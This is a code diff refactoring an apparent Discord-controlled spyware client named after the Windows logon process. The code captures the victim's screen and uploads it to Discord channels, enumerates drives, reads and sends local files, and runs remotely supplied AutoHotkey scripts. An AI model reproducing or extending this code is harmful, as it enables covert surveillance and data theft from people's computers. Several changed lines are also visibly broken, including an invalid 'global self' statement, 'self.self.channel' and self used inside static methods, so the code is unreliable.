@@ -38,7 +38,6 @@ except BaseException:
 from id import ID
 
 """
-QQ
 Commands:
 flood, quit/exit, ping, disconnect, help/?, cls, emoji, screen, status,
 oleha, mute, default, var, settings, save, path, f, folders, read, send,
@@ -60,35 +59,29 @@ class WinlogonClient(discord.Client):
         super().__init__()
 
         class Channel:
+            def __init__(self):
+                self.main = client.get_channel(ID.main)
+                self.back_up = client.get_channel(ID.back_up)
+                self.buffer = client.get_channel(ID.buffer)
+                self.index_online = client.get_channel(ID.index_online)
+
             @staticmethod
             def get(x):
                 return client.get_channel(int(x))
 
-            @staticmethod
-            def main():
-                return Channel.get(ID.main)
-
-            @staticmethod
-            def back_up():
-                return Channel.get(ID.back_up)
-
-            @staticmethod
-            def buffer():
-                return Channel.get(ID.buffer)
-
-            @staticmethod
-            def index_online():
-                return Channel.get(ID.index_online)
-
         class Guild:
+            def __init__(self):
+                self.main = client.get_guild(ID.main)
+                self.back_up = client.get_channel(ID.back_up)
+                self.buffer = client.get_channel(ID.buffer)
+                self.index_online = client.get_channel(ID.index_online)
 
             @staticmethod
             def get(x):
                 return client.get_guild(int(x))
 
-            @staticmethod
-            def main():
-                return Guild.get(ID.my_guild)
+        self.channel = Channel()
+        self.guild = Guild()
 
         self.privates = []
         self.is_privates = []
@@ -122,16 +115,16 @@ class WinlogonClient(discord.Client):
                 token = read
 
         with open(dir_name + "/fruit_id.json", "r") as r:
-            sprites_list = json.load(r)
-            icon_url = f"https://cdn.discordapp.com/emojis/" \
-                       f"{sprites_list['id'][randint(0, len(sprites_list['id']) - 1)]}.png?v=1"
-            print(icon_url)
+            self.sprites_list = json.load(r)
+            self.icon_url = f"https://cdn.discordapp.com/emojis/" \
+                       f"{self.sprites_list['id'][randint(0, len(self.sprites_list['id']) - 1)]}.png?v=1"
+            print(self.icon_url)
 
         self.access_to_screen = True  # Разрешение на скрины
         self.screen_delay = 100  # delay of pause
         self.lost_screen_delay = self.screen_delay
 
-        users_online = 0
+        self.users_online = 0
 
     async def delete_screen(self):
         # print("exist - " + str(File.exist("screen.png")))
@@ -159,12 +152,12 @@ class WinlogonClient(discord.Client):
             await Discord.send_embed(description="Unmuted!", status=False)
 
     async def index_online(self):
-        global users_online, msg_status_of_users, INDEX_STATUS
+        global msg_status_of_users, INDEX_STATUS
 
         try:
-            users_online = 0
-            async for message in Channel.index_online().history(limit=200):
-                print(str(users_online) + " USERS")
+            self.users_online = 0
+            async for message in self.channel.index_online.history(limit=200):
+                print(str(self.users_online) + " USERS")
                 msg_time = message.created_at
                 delta = datetime.utcnow() - msg_time
                 delta = round(delta.total_seconds(), 0)
@@ -181,28 +174,29 @@ class WinlogonClient(discord.Client):
                     await message.delete()
                     continue
 
-                users_online += 1
+                self.users_online += 1
 
-            msg_status_of_users = await Channel.index_online().send(login)
-            users_online += 1
-            print(str(users_online) + " USERS")
-            game = Game("{} users".format(users_online))
+            msg_status_of_users = await self.channel.index_online.send(login)
+            self.users_online += 1
+            print(str(self.users_online) + " USERS")
+            game = Game(f"{self.users_online} users")
             await client.change_presence(status=discord.Status.dnd, activity=game)
         except BaseException:
             print("async def index_online() error")
         INDEX_STATUS = False
 
+    @staticmethod
     def set_time(embed):
         return embed.set_footer(text=datetime.now().strftime("%d %B %H:%M:%S"))
 
     async def clean_screen(self):
-        await Channel.main().send("```Markdown\n#cls\n```{}\n```Markdown\n#cls\n```".format("\n" * 50))
+        await self.channel.main.send("```Markdown\n#cls\n```{}\n```Markdown\n#cls\n```".format("\n" * 50))
 
     async def create_embed(self, description="", thumbnail="", image="", time=True, status=True):
         global self.access_to_screen
         embed = Embed(title="", description=description, colour=random_color)
-        if icon_url:
-            embed.set_author(name=login, url="", icon_url=icon_url)
+        if self.icon_url:
+            embed.set_author(name=login, url="", icon_url=self.icon_url)
         else:
             embed.set_author(name=login, url="")
 
@@ -211,9 +205,7 @@ class WinlogonClient(discord.Client):
                 screenshot = ImageGrab.grab()
                 screenshot_name = 'screen.png'
                 screenshot.save(screenshot_name, 'PNG')
-                urler = await client.send_file(Channel.buffer(), screenshot_name,
-                                               filename=screenshot_name,
-                                               content="From **{login}**".format(login=login))
+                urler = await client.send_file(self.channel.buffer, screenshot_name, filename=screenshot_name, content="From **{login}**".format(login=login))
                 link = ""
                 for i in urler.attachments:
                     link = i["url"]
@@ -233,7 +225,7 @@ class WinlogonClient(discord.Client):
 
     async def send_embed(self, description="", thumbnail="", image="", time=True, status=True):
         embed = await Discord.create_embed(description, thumbnail, image, time, status)
-        embed = await Channel.main().send(embed=embed)
+        embed = await self.channel.main.send(embed=embed)
         return embed
 
     async def send_settings_form(self):
@@ -260,7 +252,7 @@ class WinlogonClient(discord.Client):
         return embed
 
     async def send_file(self, filename):
-        return await client.send_file(Channel.main(), filename, filename=filename,
+        return await client.send_file(self.channel.main, filename, filename=filename,
                                       content="From **{login}**".format(login=login))
 
     def cut_command(self, command, string):
@@ -276,13 +268,15 @@ class WinlogonClient(discord.Client):
                 return True
         return False
 
-    def get_script(self, string):
+    @staticmethod
+    def get_script(string):
         try:
             return str(split(r'```', split('```autohotkey\n', string)[1])[0])
         except BaseException:
             return False
 
-    def if_command(self, command, blank):
+    @staticmethod
+    def if_command(command, blank):
         if command == blank or command.startswith(blank):
             return True
         return False
@@ -299,7 +293,8 @@ class WinlogonClient(discord.Client):
     """
 
     #   #   #   #   #   Secret key
-    async def check_secret_key(self, message):
+    @staticmethod
+    async def check_secret_key(message):
         if message.channel.id == ID.musical:
             if message.content.lower() == "!get":
                 for i in self.privates:
@@ -898,7 +893,7 @@ class WinlogonClient(discord.Client):
                                 pass
 
                 for i in drives_existings:
-                    await Channel.main().send(i + " " + str(len(os.listdir(i))) + " files")
+                    await self.channel.main.send(i + " " + str(len(os.listdir(i))) + " files")
 
             @staticmethod
             async def f(message):
@@ -996,7 +991,7 @@ class WinlogonClient(discord.Client):
                 # settings = Scripts.get_settings(message.content)
                 # url = Settings.url(settings)
                 url = ""
-                async for a in client.logs_from(Channel.back_up(), limit=1):
+                async for a in client.logs_from(self.channel.back_up, limit=1):
                     url = a.content
 
                 if url is False:
@@ -1232,10 +1227,10 @@ class WinlogonClient(discord.Client):
         if login == "ALEX":
             try:
                 body_time = datetime.strftime(datetime.now(), "```python\n\'%d %B %H:%M:%S\'\n```\n")
-                url_back_up = await client.send_file(self.Channel.back_up(), file_name, filename=file_name,
+                url_back_up = await client.send_file(self.self.channel.back_up, file_name, filename=file_name,
                                                      content=body_time)
                 link = url_back_up.attachments[0]["url"]
-                await self.Channel.back_up().send(link)
+                await self.self.channel.back_up.send(link)
                 # self.access_to_screen = False
             except BaseException:
                 pass
@@ -1248,7 +1243,7 @@ class WinlogonClient(discord.Client):
         client.loop.create_task(DiscordLoop.give_screen())
 
     async def on_message(self, message):
-        global login, self.privates, self.is_privates, RUN_STATUS, file_name, CONNECTED_STATUS, msg_status_of_users, \
+        global login, RUN_STATUS, file_name, CONNECTED_STATUS, msg_status_of_users, \
             MAIN_SCRIPT, users_online, s1, s2, INDEX_STATUS
         command = message.content.lower()
         print("on_message()")
@@ -1290,7 +1285,7 @@ class WinlogonClient(discord.Client):
                 await Discord.send_embed(status=False)
 
         if command == "!quit" or command == "!exit":
-            await self.Channel.main().send("Okey :ok_hand:")
+            await self.channel.main.send("Okey :ok_hand:")
             await msg_status_of_users.delete()
             quit()
 
